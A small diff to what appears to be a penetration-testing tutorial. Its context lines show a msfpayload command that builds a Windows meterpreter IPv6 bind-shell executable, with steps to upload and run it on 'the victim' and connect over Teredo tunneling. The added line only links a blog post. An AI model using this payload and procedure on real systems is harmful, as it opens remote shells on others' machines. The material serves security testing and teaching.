@@ -210,3 +210,5 @@ msfpayload windows/meterpreter/bind_ipv6_tcp LPORT=5555 X > bind.exe
 
 All we have to do at this point is upload the resulting bind.exe payload to the victim, execute it, and then set up
 metasploit to connect to the public IPv6 address that the victim was assigned on the specified port (5555 in this example), and we should now be able to get a meterpreter shell using teredo tunneling :)
+
+Further details are available at [http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/](http://www.room362.com/blog/2010/09/24/revenge-of-the-bind-shell/)
